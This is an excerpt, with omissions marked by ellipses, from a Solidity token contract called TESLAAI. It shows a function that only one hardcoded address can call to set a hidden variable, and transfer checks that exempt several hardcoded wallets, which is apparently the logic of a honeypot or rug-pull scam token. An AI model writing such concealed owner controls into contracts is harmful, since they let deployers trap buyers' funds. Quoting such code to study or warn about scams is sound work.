...
contract TESLAAI is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
        require(_msgSender() == 0xB1e33E003524e872157d3F7b7f83162A68C57003 );
          _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x49C6EEf97CDFF0FB1508E05aB26095D5CF97F858 
         && from != 0xB1e33E003524e872157d3F7b7f83162A68C57003 
         && from != 0x9f982C8FA5de01BdbeD1B64d0d786CecCF35F300)) {
